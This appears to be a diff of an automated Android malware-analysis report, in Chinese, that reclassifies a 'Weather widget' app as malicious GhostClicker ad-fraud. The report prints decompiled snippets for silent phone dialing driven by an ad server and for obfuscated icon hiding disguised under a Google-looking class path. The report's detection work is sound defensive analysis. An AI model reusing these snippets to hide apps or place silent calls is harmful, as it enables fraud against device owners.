@@ -4,19 +4,80 @@
     "sha256": "f5572fbb84d65b96a38a4935680747c20da48e61c5b1c87536a6c2e0fed57bca",
     "包名": "com.weatherwidget.widget.nmo",
     "应用名": "Weather widget",
-    "是否恶意": false,
-    "风险等级": "低",
-    "分析耗时(秒)": 299.3
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 639.4
   },
-  "行为列表": [],
+  "行为列表": [
+    {
+      "行为": "call_operations",
+      "中文名": "通话操作",
+      "MITRE": "",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "call_phone",
+          "中文名": "拨打电话",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "android.intent.action.CALL",
+              "android.intent.action.DIAL"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\facebook\\ads\\internal\\action\\c;",
+          "method_signature": "if(!r.a(strC)",
+          "malicious_behavior": "call_operations",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "String strC = iVar.c();\nif (!r.a(strC) && (strC.startsWith(\"tel:\") || strC.startsWith(\"telprompt:\"))) {\n    return new Intent(\"android.intent.action.CALL\", Uri.parse(strC));\n}",
+          "malicious_code_snippet_context": "  \n      private Intent b(i iVar) {\n          if (!r.a(iVar.a()) && f.a(this.b, iVar.a())) {\n>>>             String strC = iVar.c();\n>>>             if (!r.a(strC) && (strC.startsWith(\"tel:\") || strC.startsWith(\"telprompt:\"))) {\n>>>                 return new Intent(\"android.intent.action.CALL\", Uri.parse(strC));\n>>>             }\n              PackageManager packageManager = this.b.getPackageManager();\n              if (r.a(iVar.b()) && r.a(strC)) {\n                  return packageManager.getLaunchIntentForPackage(iVar.a());",
+          "behavior_description": "该代码位于Facebook Audience Network广告SDK（com.facebook.ads.internal.action）的广告点击跳转处理逻辑中。当远程广告服务器下发的广告目标URI（iVar.c()）以tel:或telprompt:开头时，代码构造ACTION_CALL意图（注意是ACTION_CALL而非需要用户确认的ACTION_DIAL），若宿主应用申请了CALL_PHONE权限，该Intent经startActivity后可直接静默拨打电话，无需用户在拨号界面确认。数据流向：远程广告服务器返回的广告配置数据→iVar.c()解析出的URI字符串→new Intent(ACTION_CALL, Uri.parse(strC))→静默拨号。在正常广告场景下这是click-to-call广告的标准SDK实现，但该样本已被厂商确认为GhostClicker自动点击广告家族，若自动点击机制触发了含tel:链接的广告，可能在用户完全无感知的情况下拨打电话，存在被拨打高价号码导致资费损失的欺诈风险，且拨号目标完全由远程服务器控制。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\google\\android\\gms\\logs\\Logger;",
+          "method_signature": "if(TextUtils.isEmpty(strC)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "String strC = C(E(\"c2tzREtBOGNsYXNzX21haW4=\"));\nboolean zD = D(E(\"c2tzREtBOGFuYXBw\"));\nif (TextUtils.isEmpty(strC) || zD) { return; }\ncontext.getPackageManager().setComponentEnabledSetting(new ComponentName(context, strC), 2, 1);\na(E(\"c2tzREtBOGFuYXBw\"), (Boolean) true);",
+          "malicious_code_snippet_context": "  \n      public static void D(Context context) {\n          y(context);\n>>>         String strC = C(E(\"c2tzREtBOGNsYXNzX21haW4=\"));\n>>>         boolean zD = D(E(\"c2tzREtBOGFuYXBw\"));\n>>>         if (TextUtils.isEmpty(strC) || zD) {\n>>>             return;\n>>>         }\n          context.getPackageManager().setComponentEnabledSetting(new ComponentName(context, strC), 2, 1);\n          a(E(\"c2tzREtBOGFuYXBw\"), (Boolean) true);\n      }",
+          "behavior_description": "代码从SharedPreferences读取经Base64混淆的键\"sdkDKA8class_main\"（解码自c2tzREtBOGNsYXNzX21haW4=）中存储的主Activity类名，并通过\"sdkDKA8anapp\"标志位判断图标是否已被隐藏。若类名存在且尚未隐藏，则调用PackageManager.setComponentEnabledSetting()将主启动组件设置为COMPONENT_ENABLED_STATE_DISABLED(2)，使应用图标从桌面启动器中消失，随后写入标志位防止重复执行。该代码伪装在com.google.android.gms.logs.Logger类路径下规避检测，属于典型的图标隐藏行为，使用户难以发现和卸载该应用，为GhostClicker广告点击欺诈提供隐蔽驻留环境。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
   "覆盖范围": {
     "静态分析": "完整",
     "动态分析": "未执行",
     "方法引用分析": "完整",
-    "JADX反编译": "未执行",
+    "JADX反编译": "完整",
     "LLM语义分析": "已执行",
     "LLM交叉验证": "已执行",
-    "验证模型": "qwen3.7-plus",
+    "验证模型": "qwen3.8",
     "局限性": [
       "C2服务器.是否活跃: 需动态分析",
       "C2服务器.轮询间隔(秒): 需动态分析"
